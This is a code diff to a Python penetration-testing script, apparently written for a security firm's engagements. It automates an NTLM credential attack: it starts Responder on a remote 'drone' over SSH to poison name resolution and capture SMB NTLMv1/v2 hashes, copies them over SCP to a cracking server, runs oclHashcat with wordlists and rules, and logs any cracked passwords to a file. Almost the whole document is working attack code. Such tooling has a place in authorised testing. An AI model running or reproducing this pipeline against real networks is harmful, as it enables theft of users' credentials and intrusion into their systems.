@@ -16,26 +16,39 @@ import argparse
 import sys
 import subprocess
 
+class c:
+    BLU = '\033[94m'
+    GRN = '\033[92m'
+    TAN = '\033[93m'
+    RED = '\033[91m'
+    END = '\033[0m'
+
 def parse_args():
 	#Create the arguments
     parser = argparse.ArgumentParser()
-    #parser.add_argument("-d", "--droneip", help="Enter the drone IP, should be 10.120.x.4")
-    parser.add_argument("-c", "--crackerip", help="Enter the crackbox IP")
+    parser.add_argument("-d", "--droneip", help="Enter the drone IP. If setting this, must also set -l arg.")
+    parser.add_argument("-l", "--localip", help="Enter the local VPN IP. If seeting this, must also set -d arg.")
+    parser.add_argument("-c", "--crackerip", help="Enter the crackbox IP.")
     return parser.parse_args()
 
-def get_dronevpn_ips():
+def get_dronevpn_ips(args):
     '''
     Get the drone vpn ip address
     '''
-    for intf in netifaces.interfaces():
-        for link in netifaces.ifaddresses(intf)[netifaces.AF_INET]:
-            ip = link['addr']
-            # Drone VPN subnets: 10.120.*.*
-            if ip.startswith('10.120.'):
-                localip = ip
-                localip_split = localip.split('.')
-                droneip = '.'.join(localip_split[:3])+'.4'
-                return localip, droneip
+    if args.droneip and args.localip:
+        droneip = args.droneip
+        localip = args.localip
+    else:
+        for intf in netifaces.interfaces():
+            for link in netifaces.ifaddresses(intf)[netifaces.AF_INET]:
+                ip = link['addr']
+                # Drone VPN subnets: 10.120.*.*
+                if ip.startswith('10.120.'):
+                    localip = ip
+                    localip_split = localip.split('.')
+                    droneip = '.'.join(localip_split[:3])+'.4'
+
+    return localip, droneip
 
 def launch_responder(droneip, d_ssh):
     '''
@@ -44,8 +57,8 @@ def launch_responder(droneip, d_ssh):
     # Open Responder in a screen session
     cmd = 'screen -S responder -dm python /opt/Responder/Responder.py -I eth0 -wf'
     print '[*] Running on drone: {}'.format(cmd)
-    stdin, stdout, stderr = d_ssh.exec_command(cmd)
-    return (stdin, stdout, stderr)
+    #stdin, stdout, stderr = d_ssh.exec_command(cmd) ##########################
+    #return (stdin, stdout, stderr)
 
 def get_cracker_creds():
     '''
@@ -100,31 +113,18 @@ def make_hashcat_cmd(hash_file, user):
     hashcat  = '/opt/oclHashcat-1.36/oclHashcat64.bin --session {}'.format(identifier)
     hashcat += ' -m {} '
     hashcat += '-o {} /tmp/{} /opt/wordlists/* -r /opt/oclHashcat-1.36/rules/best64.rule'.format(identifier, hash_file)
-    match = re.match('SMB-NTLM(v1|v2)', hash_file)
-    if match:
-        hashtype = match.group()
-        if hashtype == 'SMB-NTLMv1':
-            hashcat = hashcat.format('5500')
-            screen = 'screen -S {} -dm {}'.format(identifier, hashcat)
-        elif hashtype == 'SMB-NTLMv2':
-            hashcat = hashcat.format('5600')
-            screen = 'screen -S {} -dm {}'.format(identifier, hashcat)
-        else:
-            return
+    if 'NTLMv1' in hash_file:
+        hashcat = hashcat.format('5500')
+        screen = 'screen -S {} -dm {}'.format(identifier, hashcat)
+    elif 'NTLMv2' in hash_file:
+        hashcat = hashcat.format('5600')
+        screen = 'screen -S {} -dm {}'.format(identifier, hashcat)
+    else:
+        return None, None
 
-        print '[+] Running on crackerbox:'
-        print '    {}'.format(screen)
-        return screen
-
-def find_cracked_hashes(ssh, identifier):
-    '''
-    Read the .pot hashcat files for cracked hashes
-    '''
-    found = False
-    while found == False:
-        cmd = 'cat {}'.format(identifier)
-        stdin, stdout, stderr = ssh.exec_command(cmd)
-        print ':', stdout.read()
+    print '[+] Running on crackerbox:'
+    print '    {}'.format(screen)
+    return screen, identifier
 
 def launch_cracking(d_scp, c_scp, c_user, c_ssh, unsent):
     '''
@@ -132,23 +132,38 @@ def launch_cracking(d_scp, c_scp, c_user, c_ssh, unsent):
     '''
     sent_hashes = []
     for u in unsent:
-        print '[+] New hash found! Downloading locally: {}'.format(u)
+        print c.TAN+'[+] New hash found! Downloading locally: {}'.format(u)+c.END
         # scp the files from the drone to the local machine
         #          remote path              local path
         d_scp.get('/opt/Responder/logs/'+u, os.getcwd()+'/'+u)
         # scp the hashes from the local machine to the crackerbox
         #         local path          remote path
         c_scp.put(os.getcwd()+'/'+u, '/tmp/'+u)
-        hashcat_cmd = make_hashcat_cmd(u, c_user)
+        hashcat_cmd, identifier = make_hashcat_cmd(u, c_user)
 
         # Just in case hashcat_cmd is none we still want to say we sent the hash over
         # so the script doesn't continually think we haven't seen that file before
         if hashcat_cmd:
             # Execute the screen session on crackerbox
             stdin, stdout, stderr = c_ssh.exec_command(hashcat_cmd)
-        sent_hashes.append(u)
+        sent_hashes.append((identifier, u))
 
     return sent_hashes
+
+def find_cracked_hashes(c_ssh, sent_hashes, cracked):
+    '''
+    Check .pot files on crackerbox for cracked hashes
+    '''
+    for i,h in sent_hashes:
+        if (i,h) not in cracked:
+            stdin, stdout, stderr = c_ssh.exec_command('cat {}.pot'.format(i))
+            out = stdout.read().strip()
+            if out != '':
+                print c.TAN + '[+] Cracked!\n    '+ out + c.END
+                with open('cracked.txt', 'a') as f:
+                    f.write(out+'\n')
+                cracked.append((i,h))
+    return cracked
 
 def main(args):
 
@@ -160,10 +175,11 @@ def main(args):
 
     hash_files = []
     sent_hashes = []
-    identifiers = []
+    cracked = []
+    ctrlc = False
 
     raw_input('[*] Hit [Enter] when you are connected to both the drone VPN and the Coalfire network')
-    localip, droneip = get_dronevpn_ips()
+    localip, droneip = get_dronevpn_ips(args)
 
     # Setup cracker scp
     c_user, c_pw = get_cracker_creds()
@@ -179,19 +195,32 @@ def main(args):
     rspndr = launch_responder(droneip, d_ssh)
 
     # Check for new hashes and send them off
-    try:
-        while 1:
-            # Check for new hashes in remote /opt/Responder/logs dir
-            remote_hash_files = parse_resp_output(d_ssh)
-            for h in remote_hash_files:
-                if h not in hash_files:
-                    hash_files.append(h)
-            unsent = [h for h in hash_files if h not in sent_hashes]
-            sent_hashes += launch_cracking(d_scp, c_scp, c_user, c_ssh, unsent)
+    while 1:
+        try:
+            # Check if user has killed Responder or not
+            if ctrlc == False:
+                # Check for new hashes in remote /opt/Responder/logs dir
+                remote_hash_files = parse_resp_output(d_ssh)
+                for h in remote_hash_files:
+                    if h not in hash_files:
+                        hash_files.append(h)
+                if len(sent_hashes) > 0:
+                    # sent_hashes = [(identifier, hash)], zip(*sent_hashes)[1] is just list of hashes
+                    unsent = [h for h in hash_files if h not in zip(*sent_hashes)[1]]
+                else:
+                    unsent = hash_files
+                sent_hashes += launch_cracking(d_scp, c_scp, c_user, c_ssh, unsent)
+
+            cracked = find_cracked_hashes(c_ssh, sent_hashes, cracked)
             time.sleep(1)
-#
-    except KeyboardInterrupt:
-        print '[*] Killing drone Responder session'
-        d_ssh.exec_command("ps aux | grep -i 'screen -s responder' | grep -v grep | awk '{print $2}' | xargs kill -9")
+
+        except KeyboardInterrupt:
+            if ctrlc == False:
+                ctrlc = True
+                print '[*] Killing drone Responder session. Hit CTRL+C again to end script.'
+                d_ssh.exec_command("ps aux | grep -i 'screen -s responder' | grep -v grep | awk '{print $2}' | xargs kill -9")
+                continue
+            else:
+                sys.exit('[-] Goodbye. Any active hashcat sessions will continue running.')
 
 main(parse_args())
